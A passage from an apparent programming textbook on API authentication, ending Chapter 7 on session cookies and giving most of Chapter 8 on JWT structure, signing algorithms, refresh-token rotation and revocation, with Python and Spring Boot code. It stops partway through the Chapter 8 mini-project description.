- **Session fixation** is defeated by always issuing a fresh session ID at login; **CSRF** is mitigated via `SameSite` and, for sensitive actions, dedicated CSRF tokens.
- Sessions and JWT are both legitimate, widely-used, situationally-appropriate choices — not "old vs new."

---

## Interview Questions — Chapter 7

**Q1. Why is session-based authentication called "stateful," and what's the practical downside of that?**
Because the server must maintain a session store recording every active login — this state must be available to whichever server instance handles a given request, which means deploying across multiple servers requires a shared store (like Redis) rather than each instance independently verifying a request, unlike stateless schemes (JWT, Chapter 8).

**Q2. Explain, precisely, why CSRF is possible with cookie-based sessions.**
Because browsers attach cookies to requests automatically, based purely on the target domain, regardless of which site's page actually triggered the request. A malicious site can therefore cause a victim's browser to send a request to your API with the victim's legitimate session cookie automatically attached, without the victim's knowledge or consent.

**Q3. What is session fixation, and how is it prevented?**
An attack where an attacker sets a known session ID on a victim's browser before login, hoping the server will "upgrade" that same session ID to authenticated status after login rather than issuing a fresh one — letting the attacker, who already knows the ID, share the now-authenticated session. Prevented by always generating a brand-new session ID at the moment of successful login, discarding any pre-existing one.

**Q4. Why does a stolen session cookie tend to be a less severe compromise than a stolen password?**
A session ID is scoped (typically expires soon, is bound to a single session's worth of access) and reveals nothing about the user's actual password — it can be revoked server-side instantly (section 7.6) without affecting the user's real credentials, unlike a stolen password, which the attacker can reuse indefinitely and potentially across other services if the user reused it.

**Q5. What does the `SameSite=Lax` cookie attribute actually restrict, precisely?**
It prevents the cookie from being attached on cross-site *subrequests* (like a background fetch or an image load triggered by another site) while still allowing it on top-level cross-site navigation (like clicking a link that takes the user to your site). `Strict` is more restrictive and blocks it in both cases.

---

## Hands-On Exercises — Chapter 7

1. Run the FastAPI implementation from section 7.10. Log in, capture the `Set-Cookie` header from the response, then call `/books` using that cookie, and finally call `/logout` and confirm the same cookie no longer works on `/books`.
2. Modify the session store to log every session's `expires_at`, wait past that time in a test, and confirm a request with an unexpired-looking cookie value still gets rejected once the server-side record has expired.
3. Explain, in your own words, why storing a session ID in `localStorage` and manually attaching it via a custom header would eliminate the CSRF risk from section 7.8 — but would also give up the automatic-attachment convenience from section 7.2. What are you trading for what?
4. Draw (ASCII or on paper) the session-fixation attack from section 7.8 step by step, then annotate exactly which single line of the section 7.10 code prevents it.

## Mini Project — Chapter 7

Build a full session-authenticated books API with proper hygiene throughout.

Requirements:
- `POST /login`, `POST /logout`, and a protected `GET /books`, all per section 7.10/7.11.
- Both absolute and idle expiration (section 7.7) implemented and independently testable.
- All required cookie flags set correctly (section 7.5) — verify them by inspecting the raw `Set-Cookie` header with `curl -i`, not just trusting your own code.
- A short written explanation of what `SameSite` value you chose for this app and why, given the app has no legitimate cross-site embedding use case.

---

## Preparing for Chapter 8

You now understand the stateful, server-remembers-you model in full. Chapter 8 introduces the opposite philosophy: tokens that carry their own proof of validity, verifiable by any server with no shared session store at all — **JWT**. Getting there properly requires first building up several prerequisites you've only briefly touched — cryptographic signing, hashing, and Base64 in more depth — all explained from scratch before a single JWT is issued.

---

*End of Chapter 7.*

---

# Chapter 8 — JWT Authentication

## 8.0 Where we left off

Chapter 7 ended with a promise: JWT flips the session model on its head — instead of a meaningless random ID that only means something because the server *remembers* it, a JWT carries its own proof of validity, checkable by any server, with no shared store required at all. Before we can responsibly issue a single JWT, we need two prerequisites you've only glimpsed so far: **hashing** (met briefly in Ch.5–6) needs a proper technical treatment, and we need an entirely new concept — **digital signatures** — which is the actual mechanism that makes a JWT trustworthy. We build both from scratch in this section before touching JWT's structure.

---

## 8.1 Prerequisite: Hashing, precisely

**Simple explanation:** A hash function takes any input and produces a fixed-size, seemingly-random output, such that even a tiny change to the input completely changes the output, and there's no way to reverse it back to the original input.

**Technical definition:** A cryptographic hash function `H` maps an input of arbitrary length to a fixed-length output (the "hash" or "digest"), with three properties that matter for this book:

1. **Deterministic** — the same input always produces the same output.
2. **One-way** — given a hash output, it's computationally infeasible to find *any* input that produces it.
3. **Avalanche effect** — changing even one bit of input produces a drastically different, unpredictable output.

```
   SHA-256("hello")
     = 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824

   SHA-256("Hello")     <- just one capital letter different
     = 185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969
                          (completely different output — avalanche effect)
```

You've already used a hash function twice — PBKDF2 for password storage (Chapter 5) and SHA-256 for API key storage (Chapter 6). What's new here is using a hash **as one ingredient inside a signature**, which we build next.

---

## 8.2 Prerequisite: Digital Signatures

**Simple explanation:** A digital signature lets someone prove "I created this exact piece of data, and it hasn't been altered since," in a way that anyone can check, but only the original signer could have produced.

**Real-world analogy — a wax seal on a letter:**

```
   A medieval noble writes a letter and presses their unique signet
   ring into hot wax on the envelope.

   Anyone receiving the letter can LOOK at the seal and recognize
   the pattern (verification — cheap, anyone can do it).

   But only someone possessing the actual signet ring could have
   PRESSED that exact pattern into the wax in the first place
   (signing — requires possessing the secret, the ring).

   If the letter's contents are altered after sealing, the seal
   would need to be broken and cannot be perfectly re-applied
   without the ring — tampering is detectable.
```

**Technical explanation — there are two different signature models, and JWT can use either (this distinction directly maps to HS256 vs RS256 in section 8.4):**

**Model A — Symmetric (shared secret):** Signing and verifying use the *exact same* secret key.

```
   Signer:    signature = HMAC(secret_key, data)
   Verifier:  recompute HMAC(secret_key, data) themselves,
              compare to the received signature — match = valid
```

> **Term defined — HMAC:** **H**ash-based **M**essage **A**uthentication **C**ode. A specific, standardized way of combining a hash function (section 8.1) with a secret key to produce a signature that proves both *integrity* (data wasn't altered) and *authenticity* (came from someone who knows the secret).

**Model B — Asymmetric (public/private key pair):** Signing uses a **private key** (kept secret); verification uses a mathematically related **public key** (freely shareable).

```
   Signer (holds PRIVATE key):    signature = Sign(private_key, data)
   Verifier (holds PUBLIC key):   Verify(public_key, data, signature)
                                   -> true/false

   Critically: the public key can verify a signature, but CANNOT
   be used to create a new valid one — that requires the private key.
```

> **Remember:** Symmetric signing (Model A) is simpler and faster, but **anyone who can verify can also forge** a new signature, since verifying and signing use the identical secret — meaning every party that needs to *check* a token must be just as trusted as the party that *issues* it. Asymmetric signing (Model B) breaks this coupling: you can hand out the public key freely to anyone who needs to *verify* tokens, while only the issuer, holding the private key, can *create* them. This exact trade-off is *why* JWT offers both HS256 and RS256 — the right choice depends on whether your verifiers can be fully trusted with signing power.

---

## 8.3 JWT Structure

**Simple explanation:** A JWT is three pieces of Base64-encoded data, joined by dots, that together let anyone verify "this data hasn't been tampered with since a trusted issuer created it."

**Technical definition:** JWT stands for **J**SON **W**eb **T**oken. It consists of three parts:

```
   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9  .  eyJzdWIiOiI4ODIzIiwiZXhwIjoxNzU0MzkyMDAwfQ  .  4f8c9d2e1a...
   └───────────────┬───────────────────┘    └────────────────┬──────────────────────┘    └─────┬─────┘
              HEADER (Base64Url)                       PAYLOAD (Base64Url)                 SIGNATURE
           (algorithm + token type)                 (claims — the actual data)         (proves integrity)
```

> **Note — "Base64Url," not plain Base64:** JWT uses a very slight variant of Base64 (from Chapter 5) called Base64URL, which replaces the `+` and `/` characters (which have special meaning inside URLs) with `-` and `_`, so a JWT can safely be placed directly into a URL or header without further escaping.

**Decoding the header** (Base64Url-decode the first segment):
```json
{"alg": "HS256", "typ": "JWT"}
```

**Decoding the payload** (Base64Url-decode the second segment):
```json
{"sub": "8823", "name": "Anuj Sharma", "exp": 1754392000}
```

**The signature** is computed as:
```
signature = HMAC-SHA256(
    secret_key,
    base64url(header) + "." + base64url(payload)
)
```

> **Critical point, repeated because it is so commonly misunderstood:** The header and payload are only **Base64-encoded, not encrypted** — precisely the same distinction drilled into Chapter 5 for Basic Auth. **Anyone can decode a JWT and read its contents**, including that expiration timestamp and any user data inside it, without any secret at all. The signature does not hide the data — it only proves the data hasn't been *altered* since a party holding the correct signing key created it.

```python
>>> import base64, json
>>> payload_b64 = "eyJzdWIiOiI4ODIzIiwiZXhwIjoxNzU0MzkyMDAwfQ"
>>> # pad to a multiple of 4 chars, Base64Url requires this in some decoders
>>> padded = payload_b64 + "=" * (-len(payload_b64) % 4)
>>> json.loads(base64.urlsafe_b64decode(padded))
{'sub': '8823', 'exp': 1754392000}
```

> **Common Mistake:** Putting secret data (a password, a credit card number, an internal-only field) directly into a JWT payload, believing it's "encrypted" because the token looks like random gibberish. It is not encrypted — it's encoded and signed. **Never put anything in a JWT payload you wouldn't be comfortable printing on a public sign.**

---

## 8.4 Claims

**Term defined — claim:** A single key-value statement inside the JWT payload, asserting something about the subject of the token (typically, the authenticated user).

JWT organizes claims into three categories:

**Registered claims** — standardized, optional, but recommended names with agreed-upon meaning, so different systems can interoperate:

| Claim | Meaning |
|---|---|
| `iss` | Issuer — who created/issued this token |
| `sub` | Subject — who the token is about (typically the user ID) |
| `aud` | Audience — who/what this token is intended for |
| `exp` | Expiration time (Unix timestamp) — token is invalid after this |
| `iat` | Issued at (Unix timestamp) |
| `nbf` | Not before — token isn't valid until this time |
| `jti` | JWT ID — a unique identifier for this specific token (used for revocation, section 8.9) |

**Public claims** — custom claims meant to be shared/understood across organizations, ideally registered in a public namespace or made collision-resistant (e.g., namespaced as a URI) to avoid clashing with someone else's claim of the same name.

**Private claims** — custom claims agreed upon between specific parties for their own application's needs (e.g., `"role": "customer"`, `"accountId": 8823`) — the vast majority of claims you add in practice fall into this category.

```json
{
  "iss": "api.mybank.com",
  "sub": "8823",
  "aud": "mybank-mobile-app",
  "iat": 1754388400,
  "exp": 1754392000,
  "role": "customer",
  "accountIds": [8823]
}
```

---

## 8.5 Signing Algorithms — HS256 vs RS256

Directly applying section 8.2's two models:

| | HS256 | RS256 |
|---|---|---|
| Model | Symmetric (Model A) | Asymmetric (Model B) |
| Key(s) | One shared secret, used for both signing and verifying | A private key (signs) + public key (verifies) |
| Who can issue new valid tokens | Anyone holding the shared secret | Only whoever holds the private key |
| Who can verify | Anyone holding the shared secret | Anyone holding the public key (can be widely distributed) |
| Typical use case | Single backend service that both issues and verifies its own tokens | Multiple independent services need to *verify* tokens issued by one central authority (microservices, Ch.13; OAuth, Ch.9) |
| Risk if the verifying party is compromised | Attacker gets the shared secret → **can forge new valid tokens** | Attacker gets the public key → can only verify, **cannot forge** new tokens |

```
   HS256:                                   RS256:

   Auth Service          Order Service      Auth Service          Order Service
   ┌───────────┐         ┌───────────┐      ┌───────────┐         ┌───────────┐
   │  secret X  │ <-----> │  secret X  │      │ PRIVATE key │         │ PUBLIC key │
   │  (signs)    │  same   │ (verifies) │      │  (signs)     │  <----- │ (verifies) │
   └───────────┘  key!    └───────────┘      └───────────┘  can't    └───────────┘
                                                              forge with
   Order Service could ALSO forge                            just the
   tokens claiming to be Auth Service --                     public key
   they hold the same secret.
```

> **Interview Tip:** "When would you choose RS256 over HS256?" Strong answer: whenever multiple independent services need to *verify* tokens but only one central authority should be able to *issue* them — e.g., a microservices architecture (Chapter 13) where a dozen services all need to check incoming JWTs but you don't want to hand your token-signing secret to all twelve of them (since any one of them could then forge tokens for any user). RS256's public/private split cleanly separates "can verify" from "can issue."

---

## 8.6 Token Generation

**Reference implementation (Python / FastAPI), using `PyJWT`:**

```python
import jwt   # PyJWT library
from datetime import datetime, timedelta, timezone

SECRET_KEY = "a-long-random-secret-never-hardcoded-in-real-code"  # see 8.11
ALGORITHM = "HS256"
ACCESS_TOKEN_TTL_MINUTES = 15   # deliberately short — see 8.8, 8.11

def create_access_token(user_id: str, role: str) -> str:
    now = datetime.now(timezone.utc)
    payload = {
        "sub": user_id,
        "role": role,
        "iat": now,
        "exp": now + timedelta(minutes=ACCESS_TOKEN_TTL_MINUTES),
    }
    # jwt.encode performs exactly the three steps from section 8.3:
    # Base64Url-encode the header, Base64Url-encode the payload,
    # compute the HMAC-SHA256 signature over both, join with dots.
    return jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)

token = create_access_token(user_id="8823", role="customer")
print(token)
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI4ODIzIiwicm9sZSI6ImN1c3RvbWVyIiwiaWF0IjoxNzU0Mzg4NDAwLCJleHAiOjE3NTQzODkzMDB9.4f8c9d2e...
```

---

## 8.7 Token Validation

```python
def verify_access_token(token: str) -> dict:
    try:
        # jwt.decode does THREE things internally, in this order:
        # 1. Re-computes the HMAC signature over the received header+payload
        #    using SECRET_KEY, and compares it to the signature segment —
        #    this is the exact verification step from section 8.2, Model A.
        # 2. If the signature doesn't match, raises InvalidSignatureError
        #    IMMEDIATELY — the payload is never trusted if the signature fails.
        # 3. Checks the "exp" claim against the current time, raising
        #    ExpiredSignatureError if the token has expired.
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        return payload
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Invalid token")
```

> **Critical security point:** Notice `algorithms=[ALGORITHM]` is explicitly passed as an **allow-list**, not inferred from the token's own header. This defends against a real, documented attack: a maliciously crafted token could set its own header to claim `"alg": "none"` (a real, legal JWT value meaning "unsigned"), and a naive verifier that trusts the token's *own claimed algorithm* would skip signature verification entirely, accepting a completely forged token. **Always pin the expected algorithm(s) on the verifying side — never trust the algorithm named inside the token itself.**

---

## 8.8 Access Tokens vs Refresh Tokens

**The problem this solves:** Section 8.6 used a deliberately short, 15-minute expiration. Short expiration limits the damage window if a token is stolen (Chapter 4's bearer-token risk) — but it's also terrible UX if it means the user has to fully re-enter their password every 15 minutes.

**The solution — two tokens with different lifetimes and different jobs:**

| | Access Token | Refresh Token |
|---|---|---|
| Purpose | Sent on every API request to prove identity | Used *only* to obtain a new access token, when the old one expires |
| Lifetime | Short (minutes) | Long (days/weeks) |
| Sent to | Every protected endpoint | Only a dedicated `/refresh` endpoint |
| Storage sensitivity | Moderate (short blast radius if stolen) | High (long blast radius if stolen — often stored more carefully, e.g., `HttpOnly` cookie rather than accessible JS storage) |

```
   Client                                          Server
     │                                                │
     │  POST /login {username, password}                │
     │ ──────────────────────────────────────────────>│
     │  {"access_token": "...", "refresh_token": "..."}  │
     │ <──────────────────────────────────────────────│
     │                                                │
     │  [ ... 15 minutes of API calls using             │
     │      access_token ... ]                            │
     │                                                │
     │  GET /accounts/8823                               │
     │  Authorization: Bearer <expired access_token>       │
     │ ──────────────────────────────────────────────>│
     │  401 {"error": "token_expired"}                   │
     │ <──────────────────────────────────────────────│
     │                                                │
     │  POST /refresh                                    │
     │  {"refresh_token": "..."}                            │
     │ ──────────────────────────────────────────────>│
     │                                                │  verify refresh token,
     │                                                │  issue a BRAND NEW
     │                                                │  access token (and
     │                                                │  optionally a new
     │                                                │  refresh token, 8.9)
     │  {"access_token": "<new one>"}                     │
     │ <──────────────────────────────────────────────│
```

```python
import secrets
from datetime import datetime, timedelta, timezone
from pydantic import BaseModel

REFRESH_TOKEN_TTL_DAYS = 14
REFRESH_TOKEN_STORE: dict[str, dict] = {}   # token_id -> record, see 8.9/8.10

class RefreshRequest(BaseModel):
    # Same lesson as Chapter 7's LoginRequest: a bare `refresh_token: str`
    # parameter would become a QUERY parameter, putting a long-lived
    # credential into the URL, logs, and browser history.
    refresh_token: str

def create_refresh_token(user_id: str) -> str:
    token_id = secrets.token_urlsafe(32)   # an OPAQUE token, not a JWT itself,
                                             # in this design — simpler to revoke
                                             # outright by deleting the record (8.10)
    REFRESH_TOKEN_STORE[token_id] = {
        "user_id": user_id,
        # A refresh token needs its OWN expiry. Because it is opaque rather
        # than a JWT, no `exp` claim is carried inside it — so if the server
        # doesn't record and check an expiry itself, the token lives forever.
        "expires_at": datetime.now(timezone.utc) + timedelta(days=REFRESH_TOKEN_TTL_DAYS),
    }
    return token_id

@app.post("/refresh")
def refresh(body: RefreshRequest):
    record = REFRESH_TOKEN_STORE.get(body.refresh_token)
    if record is None:
        raise HTTPException(status_code=401, detail="Invalid or revoked refresh token")
    if datetime.now(timezone.utc) > record["expires_at"]:
        del REFRESH_TOKEN_STORE[body.refresh_token]
        raise HTTPException(status_code=401, detail="Refresh token expired")
    new_access_token = create_access_token(user_id=record["user_id"], role="customer")
    return {"access_token": new_access_token}
```

> **Note:** Refresh tokens are sometimes implemented as JWTs too, but are just as often implemented as simple opaque random strings (as above) checked against a server-side store — because, unlike access tokens, refresh tokens are used infrequently enough that the "no database lookup needed" benefit of JWT's statelessness (section 8.12) matters less, while easy server-side revocability (section 8.10) matters more.

---

## 8.9 Token Rotation

**Simple explanation:** Every time a refresh token is used, issue a brand-new refresh token and invalidate the old one — rather than reusing the same refresh token indefinitely for its whole lifetime.

**Why:** This bounds the damage of a stolen refresh token, and, critically, enables **theft detection**: if a refresh token is ever presented *twice* (once by the legitimate user, once by a thief who stole it earlier), the second use is immediately suspicious — because a correctly-rotating system should have already invalidated it after its first, legitimate use.

```python
# Rotation gives you theft DETECTION, but only if you keep a record of
# tokens you have already rotated away. If you simply delete them, a
# replayed stolen token is indistinguishable from a typo — see below.
USED_REFRESH_TOKENS: dict[str, str] = {}   # rotated-away token_id -> user_id

@app.post("/refresh")
def refresh(body: RefreshRequest):
    token = body.refresh_token
    record = REFRESH_TOKEN_STORE.get(token)

    if record is None:
        # Was this a token we ALREADY rotated away? If so, someone is
        # replaying a used refresh token — the legitimate user and a thief
        # both hold copies, and we cannot tell which one is talking to us.
        # The correct response is to distrust the whole family: kill every
        # session for that user and force a fresh password login.
        compromised_user = USED_REFRESH_TOKENS.get(token)
        if compromised_user is not None:
            revoke_all_sessions_for_user(compromised_user)   # defensive response
            raise HTTPException(status_code=401, detail="Token reuse detected; sessions revoked")
        raise HTTPException(status_code=401, detail="Invalid or revoked refresh token")

    if datetime.now(timezone.utc) > record["expires_at"]:
        del REFRESH_TOKEN_STORE[token]
        raise HTTPException(status_code=401, detail="Refresh token expired")

    user_id = record["user_id"]
    del REFRESH_TOKEN_STORE[token]                     # old one is now dead
    USED_REFRESH_TOKENS[token] = user_id                # ...but remembered, for detection
    new_refresh_token = create_refresh_token(user_id)   # brand new one issued
    new_access_token = create_access_token(user_id, role="customer")
    return {"access_token": new_access_token, "refresh_token": new_refresh_token}
```

> **Common Mistake:** implementing rotation by *deleting* the old token and stopping there. That correctly limits a stolen token's lifetime, but it throws away the detection signal entirely — a replayed stolen token then returns the same generic "invalid token" error as a mistyped one, so the theft is never noticed and the attacker simply waits for the *next* rotation window. The `USED_REFRESH_TOKENS` record above is what converts rotation from a mitigation into an alarm. In production this belongs in Redis with a TTL slightly longer than the refresh token's own lifetime, not an unbounded in-memory dict.

---

## 8.10 Blacklisting and Revocation

This directly confronts JWT's biggest structural weakness, flagged back in section 8.5's comparison table: **a JWT, once issued, is valid until it expires — there's no built-in way to revoke it early**, unlike a session (Chapter 7), which can be deleted from the server's store instantly.

**Two common mitigations:**

**1. A blacklist (deny-list) of revoked token IDs (`jti`):**
```python
import uuid

REVOKED_JTI_STORE: set[str] = set()

def create_access_token_with_jti(user_id: str) -> str:
    jti = str(uuid.uuid4())   # a unique ID for THIS specific token
    now = datetime.now(timezone.utc)
    payload = {
        "sub": user_id,
        "jti": jti,
        "iat": now,
        "exp": now + timedelta(minutes=ACCESS_TOKEN_TTL_MINUTES),
    }
    return jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)

def verify_and_check_revocation(token: str) -> dict:
    payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
    # Use .get(), not payload["jti"] — a validly-signed token issued before
    # you added jti (or by another service) has no such claim, and a raw
    # KeyError here becomes a 500 instead of a clean 401.
    jti = payload.get("jti")
    if jti is None or jti in REVOKED_JTI_STORE:
        raise HTTPException(status_code=401, detail="Token has been revoked")
    return payload

def revoke_token(jti: str):
    REVOKED_JTI_STORE.add(jti)
```

> **Remember:** entries in a revocation list only need to live until the token would have expired anyway — after `exp` passes, the signature check rejects it regardless. Storing revoked `jti` values in Redis with a TTL equal to the token's remaining lifetime keeps the deny-list naturally bounded; a plain in-memory `set` that only ever grows is a memory leak in disguise.

> **Important, and worth sitting with:** Notice this reintroduces a server-side lookup on every request — which quietly gives up JWT's headline "no shared state needed" advantage (section 8.12) for exactly the tokens you need to be revocable. This is a genuine, well-known tension in JWT system design, not a solved problem — it's a real trade-off you are making deliberately, not a bug in your implementation.

**2. Keep access token lifetimes very short (the more common real-world mitigation):** rather than building revocation infrastructure for access tokens at all, accept that a stolen access token remains valid for, say, 15 minutes — a bounded, acceptable risk window — and put your *actual* revocation control on the **refresh token** (section 8.8–8.9), which is checked against a server-side store on every use anyway, and where revoking it simply prevents any *future* access tokens from being issued.

> **Interview Tip:** "How do you revoke a JWT before it expires?" A strong answer explicitly names both approaches above and states the trade-off, rather than presenting blacklisting as a free, "solved" answer — this shows you understand JWT's actual architectural trade-offs rather than having memorized a single "the answer is a blacklist" fact.

---

## 8.11 Security Best Practices — consolidated

- **Never use a weak, guessable, or hardcoded-in-source-control signing secret.** For HS256, use a long, high-entropy random secret (section 8.2's Model A security rests entirely on this secret staying secret); load it from environment variables or a secrets manager, never commit it to source control.
- **Always pin the expected algorithm on the verifying side** (section 8.7) — never trust the token's own `alg` header.
- **Keep access tokens short-lived**; use refresh tokens (section 8.8) for long-lived sessions, with rotation (section 8.9).
- **Never put sensitive data in the payload** (section 8.3) — it's readable by anyone, always.
- **Validate `exp` (and `nbf`/`iat` if used) on every single verification** — don't skip expiration checks "for convenience" in development and forget to re-enable them.
- **Use HTTPS always** — a JWT intercepted in transit is exactly as usable to an attacker as any other bearer token (Chapter 4), regardless of how strong its signature is.
- **Consider `aud` (audience) validation** when a token might be presented to multiple services, to prevent a token issued for Service A from being replayed against Service B.

---

## 8.12 Stateless Authentication — tying it all together

This is the payoff of the whole chapter. Compare directly to Chapter 7's sequence:

```
   SESSION-BASED (Ch.7):                       JWT-BASED (this chapter):

   Client        Server      Session Store       Client        Server
     │              │              │                │              │
     │  request      │              │                │  request       │
     │  + session_id  │              │                │  + JWT           │
     │ ────────────> │              │                │ ────────────>  │
     │              │  lookup ────> │                │              │  verify signature
     │              │              │                │              │  LOCALLY —
     │              │  <──── found │                │              │  no external
     │              │              │                │              │  lookup needed!
     │  response      │              │                │  response       │
     │ <──────────── │              │                │ <──────────── │
```

**Why this matters at scale:** any server instance — even one that has *never seen this user before* and shares no memory with whichever server issued the token — can independently verify a JWT, as long as it holds the correct verification key (the shared secret for HS256, or the public key for RS256). This is exactly why JWT is such a natural fit for **microservices** (a dozen independent services, each able to verify tokens without a shared session database) and horizontally-scaled deployments — a theme we return to concretely in Chapter 13.

---

## 8.13 Reference implementation (Spring Boot / Java)

```java
@Component
public class JwtService {

    @Value("${jwt.secret}")   // loaded from environment/config, per section 8.11
    private String secret;

    private static final long ACCESS_TOKEN_TTL_MS = 15 * 60 * 1000;

    public String createAccessToken(String userId, String role) {
        Date now = new Date();
        Date expiry = new Date(now.getTime() + ACCESS_TOKEN_TTL_MS);

        return Jwts.builder()
            .setSubject(userId)
            .claim("role", role)
            .setIssuedAt(now)
            .setExpiration(expiry)
            // signWith performs exactly the HMAC-SHA256 signature step
            // from section 8.6 — same underlying algorithm, same three
            // JWT segments produced, different library syntax.
            .signWith(Keys.hmacShaKeyFor(secret.getBytes()), SignatureAlgorithm.HS256)
            .compact();
    }

    public Claims verifyToken(String token) {
        try {
            return Jwts.parserBuilder()
                // Explicitly pins the verification key — the Java library's
                // equivalent of pinning `algorithms=[ALGORITHM]` in section 8.7;
                // it will not blindly trust an unexpected algorithm from the token.
                .setSigningKey(Keys.hmacShaKeyFor(secret.getBytes()))
                .build()
                .parseClaimsJws(token)
                .getBody();
        } catch (ExpiredJwtException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, "Token expired");
        } catch (JwtException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, "Invalid token");
        }
    }
}

@Component
public class JwtAuthFilter extends OncePerRequestFilter {

    private final JwtService jwtService;

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                     HttpServletResponse response,
                                     FilterChain chain) throws IOException, ServletException {
        String header = request.getHeader("Authorization");
        if (header != null && header.startsWith("Bearer ")) {
            String token = header.substring(7);
            Claims claims = jwtService.verifyToken(token);   // throws -> caught by
                                                                // Spring's exception handling,
                                                                // resulting in a clean 401
            var auth = new UsernamePasswordAuthenticationToken(
                claims.getSubject(), null,
                List.of(new SimpleGrantedAuthority("ROLE_" + claims.get("role"))));
            SecurityContextHolder.getContext().setAuthentication(auth);
        }
        chain.doFilter(request, response);
    }
}
```

This slots into the exact same `SecurityFilterChain` position `.httpBasic()` occupied in Chapter 5, and `ApiKeyAuthFilter` occupied in Chapter 6 — a recurring architectural pattern across every scheme this book has covered so far.

> **Note on JJWT versions — this trips people up constantly.** The code above uses the **0.11.x** API (`Jwts.parserBuilder()`, `setSubject()`, `setExpiration()`). In **0.12.x and later** those were renamed and the old ones deprecated, so copying 0.11-era code into a new project produces compile errors that look mysterious. The mapping:
>
> | 0.11.x | 0.12.x+ |
> |---|---|
> | `Jwts.parserBuilder()` | `Jwts.parser()` |
> | `.setSigningKey(key)` | `.verifyWith(secretKey)` |
> | `.parseClaimsJws(t).getBody()` | `.parseSignedClaims(t).getPayload()` |
> | `.setSubject(s)` / `.setExpiration(d)` | `.subject(s)` / `.expiration(d)` |
> | `.signWith(key, SignatureAlgorithm.HS256)` | `.signWith(key)` — algorithm inferred from key type |
>
> The 0.12.x form of the verification method:
> ```java
> return Jwts.parser()
>     .verifyWith(Keys.hmacShaKeyFor(secret.getBytes(StandardCharsets.UTF_8)))
>     .build()
>     .parseSignedClaims(token)
>     .getPayload();
> ```
> One thing is identical in both versions and worth stating plainly: `Keys.hmacShaKeyFor` **throws if the secret is shorter than 256 bits** (32 bytes). That is deliberate, not an inconvenience to work around — a short HS256 secret is brute-forceable offline, and section 8.11's warning about weak signing secrets is exactly what the library is enforcing for you. Generate it with `openssl rand -base64 32`, never by typing a memorable phrase.

---

## Chapter 8 Summary

- **Hashing** (section 8.1) is deterministic, one-way, and exhibits the avalanche effect — it's an ingredient inside, not the whole of, a digital signature.
- **Digital signatures** prove data integrity and authorship; **HMAC** (symmetric, shared secret) and **public/private key signing** (asymmetric) are the two models, directly mapping to **HS256** and **RS256**.
- A **JWT** = Base64Url(header) + Base64Url(payload) + signature, joined by dots — the header and payload are **encoded, not encrypted**; anyone can read them; only the signature prevents undetected tampering.
- **Claims** are the payload's key-value statements: registered (`sub`, `exp`, `iss`, etc.), public, and private (application-specific).
- **HS256** is simpler but couples issuing and verifying trust; **RS256** cleanly separates "can sign" (private key) from "can verify" (public key) — critical for multi-service architectures (Chapter 13 revisits this).
- **Never trust a token's self-declared algorithm** during verification — always pin the expected algorithm(s) explicitly, defending against the `"alg": "none"` forgery class.
- **Access tokens** (short-lived) + **refresh tokens** (long-lived, server-tracked) balance security with usability; **rotation** on every refresh enables theft detection.
- JWT's core weakness is **early revocation** — mitigated via blacklisting (reintroduces server-side state, a real trade-off) or, more commonly, by keeping access tokens short-lived and controlling revocation at the refresh-token layer instead.
- JWT's core strength is **statelessness** — any server holding the right verification key can validate a token independently, with no shared session store — the foundation for Chapter 13's microservices patterns.

---

## Interview Questions — Chapter 8

**Q1. Is a JWT encrypted?**
No. The header and payload are only Base64Url-encoded — freely and instantly readable by anyone, with no secret needed. Only the signature is cryptographically protected, and its purpose is to prove the token hasn't been tampered with since a trusted party (holding the correct key) issued it — not to hide the token's contents.

**Q2. Why should the verifying code always explicitly specify the expected signing algorithm, rather than trusting the algorithm listed in the token's own header?**
Because a maliciously crafted token could set its header to claim a different or even "no" algorithm (`"alg": "none"`); a verifier that blindly trusts this claim could be tricked into skipping signature verification entirely, accepting a fully forged token. Pinning the expected algorithm(s) on the verifying side closes this attack.

**Q3. What's the fundamental architectural difference between HS256 and RS256, and when would you choose each?**
HS256 uses one shared secret for both signing and verifying — simple, but anyone who can verify tokens could also forge new ones, since they hold the same secret. RS256 uses a private key to sign and a separate public key to verify — the public key can be distributed freely to many verifying services without giving any of them the power to issue new valid tokens. Choose RS256 when multiple independent services need to verify tokens issued by a single central authority; HS256 is fine when one service both issues and verifies its own tokens.

**Q4. Why can't a JWT be easily revoked before it expires, and what are the two main ways to work around this?**
Because verification (in the common case) is entirely local/stateless — the server checks only the signature and the `exp` claim, with no external lookup, so there's nothing to "delete" the way a session record can be deleted (Chapter 7). Workarounds: (1) maintain a blacklist/deny-list of revoked token IDs, checked on every verification — which reintroduces the server-side lookup that stateless JWTs were meant to avoid; or (2) keep access tokens short-lived so the exposure window is small by design, and enforce actual revocation control at the refresh-token layer, which is already checked server-side on every use.

**Q5. Why use separate access and refresh tokens instead of one long-lived token?**
A single long-lived token would need to be sent on every request, maximizing its exposure and the damage if stolen, while also being hard to revoke early (per Q4). Splitting into a short-lived access token (used constantly, bounded blast radius) and a long-lived refresh token (used rarely, only against a dedicated endpoint, checked server-side, and revocable) balances security against not forcing the user to log in with their password repeatedly.

---

## Hands-On Exercises — Chapter 8

1. Take any JWT generated by section 8.6's code, and manually Base64Url-decode its header and payload segments by hand (or with a one-line script) — confirm you can read both without knowing the secret key.
2. Modify one character in a valid JWT's payload segment (re-encode it if needed) and confirm `jwt.decode(...)` rejects it — explain, referencing section 8.2, exactly why the signature no longer matches.
3. Implement the `jti`-based blacklist from section 8.10, issue a token, use it successfully, revoke it, and confirm subsequent use of the same (still cryptographically valid, non-expired) token is now rejected.
4. Write, in your own words, a short paragraph explaining to a junior developer why "the token is 500 characters of random-looking gibberish" does not mean it's safe to put a user's home address inside it.

## Mini Project — Chapter 8

Build a complete JWT-authenticated version of the books API with the full access/refresh pattern.

Requirements:
- `POST /login` → returns both an access token (15 min TTL) and a refresh token (14 day TTL, stored server-side per section 8.8).
